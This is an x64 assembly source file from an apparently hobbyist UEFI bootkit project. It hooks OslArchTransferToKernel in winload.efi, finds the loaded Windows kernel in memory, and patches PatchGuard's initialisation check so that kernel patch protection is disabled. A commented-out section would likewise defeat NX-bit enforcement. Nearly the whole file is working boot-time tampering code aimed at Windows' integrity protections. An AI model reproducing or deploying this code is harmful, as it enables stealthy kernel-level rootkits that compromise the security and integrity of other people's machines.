; ++
;
; Copyright (c) dude719.  All rights reserved.
;
; Module:
;
;	hooks.asm
;
; Summary:
;
;    This module implements a hook for OslArchTransferToKernel in winload.efi
;
; Environment:
;
;    UEFI firmware
;
; --

;*********************************************************************
; Public symbols
; Saved OslArchTransferToKernel location and bytes from before the patch
public OslArchTransferToKernelBackup
public OslArchTransferToKernelPatchLocation

;*********************************************************************
; .data section
.DATA

ALIGN 16

; Saved OslArchTransferToKernel bytes from before the patch
OslArchTransferToKernelBackup db 5 dup(0)
OslArchTransferToKernelPatchLocation dq 0

; Original OslArchTransferToKernel address
extern oOslArchTransferToKernel:dq
; Winload functions
extern EfiStall:dq
extern EfiConOutOutputString:dq


; Kernel patch patterns
extern sigNxSetBit:db
extern sigNxSetBitSize:qword
extern sigInitPatchGuard:db
extern sigInitPatchGuardSize:qword


; UEFI System Table for printing to console
extern gST:dq

; Test string for PrintString
TestString dw "A","S","M"," ","T","E","S","T", 000Dh, 000Ah, 0000h



;*********************************************************************
; .text section
.CODE

;*********************************************************************
; EFI_STATUS 
; PrintString( 
;	IN CHAR16* Str 
; );				
;*********************************************************************
PrintString PROC
	sub rsp, 30h
	mov rdx, rcx ; Str
	mov rax, gST
	mov r8, [rax + 40h]
	mov rcx, r8
	call qword ptr [r8 + 8h]
	add rsp, 30h
	ret
PrintString ENDP

PrintStringTest PROC
	lea rcx, TestString
	call PrintString
	ret
PrintStringTest ENDP

;
; Our OslArchTransferToKernelHook hook
;
; VOID __fastcall OslArchTransferToKernel(VOID *KernelParams, VOID *KiSystemStartup)
;
OslArchTransferToKernelHook PROC
	; Save registers to do our kernel patching
	push r15
	push r14
	push r13
	push r12
	push r11
	push r10
	push r9
	push r8
	push rbp
	push rdi
	push rsi
	push rdx ; rdx is a pointer to KiSystemStartup
	push rcx ; rcx is a pointer to kernel loading paramters
	push rbx
	push rax
	pushfq
	mov rbp, rsp
	and rsp, 0FFFFFFFFFFFFFFF0h ; align stack

	;mov rcx, 10 * 1000000 ; stall 10 seconds
	;mov rax, EfiStall
	;call rax

	; Before we do anything lets restore the original function bytes
restore_bytes:
	lea rsi, OslArchTransferToKernelBackup
	mov rdi, OslArchTransferToKernelPatchLocation
	mov rcx, 5 ; our patch size was 5 bytes
	rep movsb byte ptr [rdi], byte ptr [rsi] ; restore bytes

	; Search image base
begin_patch_process:
	and rdx, 0FFFFFFFFFFFFF000h ; align KiSystemStartup
get_imagebase:
	cmp word ptr [rdx], 05A4Dh ; look for 'MZ'
	je get_imagesize
	sub rdx, 01000h
	jmp get_imagebase
get_imagesize:
	mov ecx, dword ptr [rdx + 3Ch]	; get e_lfanew from DOS header
	mov ebx, dword ptr [rdx + rcx + 50h] ; get SizeOfImage from OptionialHeader in PE

	; Skip setting the NX bit for when we want to set executable memory in kernel
;skip_nx_bit:
;	lea rcx, sigNxSetBit
;	sub rbx, sigNxSetBitSize
;	push rdx
;	mov rax, rdx
;	mov rdx, sigNxSetBitSize
;	call find_pattern
;	cmp rax, 0
;	je OslArchTransferToKernelHook_exit
;	mov byte ptr[rax], 0EBh ; Patch 'jz short' to 'jmp short'

	; Get rid of patchguard
fuck_you_patchguard:
	push rdx ; rdx is the image base, back it up on the stack
	mov rcx, rdx ; image base now in rcx
	mov rdx, rbx ; image size stored in rdx
	lea r8, sigInitPatchGuard ; pattern stored in r8
	mov r9, sigInitPatchGuardSize ; pattern size stored in r9
	call FindPattern
	pop rdx ; restore image base
	cmp rax, 0
	je OslArchTransferToKernelHook_exit
	mov byte ptr[rax], 0EBh ; Patch 'jz short' to 'jmp short'

	; Exit hook - restore registers, and jump to the original function
OslArchTransferToKernelHook_exit:
	mov rsp, rbp
	popfq
	pop rax
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
	pop rbp
	pop r8
	pop r9
	pop r10
	pop r11
	pop r12
	pop r13
	pop r14
	pop r15

	; jump to original
	jmp qword ptr [oOslArchTransferToKernel]

OslArchTransferToKernelHook ENDP

;*********************************************************************
; Find a pattern (Wildcard is 0xCC)
;
; UINT64 FindPattern(VOID* ImageBase, UINT32 ImageSize, UINT8* Pattern, UINT32 PatternSize);
;
; RCX = ImageBase
; RDX = ImageSize
; R8  = Pattern
; R9  = PatternSize
;
; Returns address that pattern is found or NULL if not found
; 
;*********************************************************************
FindPattern PROC
 
pattern_search_begin:
	push rcx
	push rdi ; backup som regs
	push rsi
	push r10
	xor rdi, rdi ; zero out some regs
	xor rsi, rsi
	xor r10, r10
	sub rdx, r9 ; sub pattern size from image size
pattern_search_loop: ; main loop
	cmp rsi, rdx ; check if at end of the image
	jae pattern_search_not_found
	mov r10b, byte ptr [r8 + rdi]
	cmp r10b, byte ptr [rcx + rdi]
	je pattern_search_matched
	cmp r10b, 0CCh ; check wildcard
	jne pattern_search_continue
pattern_search_matched:
	inc rdi
	cmp rdi, r9
	jae pattern_search_exit
	jmp pattern_search_loop
pattern_search_continue:
	xor rdi, rdi
	inc rcx
	inc rsi
	jmp pattern_search_loop
pattern_search_not_found:
	xor rcx, rcx ; return NULL
pattern_search_exit:
	mov rax, rcx ; return value that pattern was found at
	pop r10
	pop rsi
	pop rdi
	pop rcx
	ret
 
FindPattern ENDP

END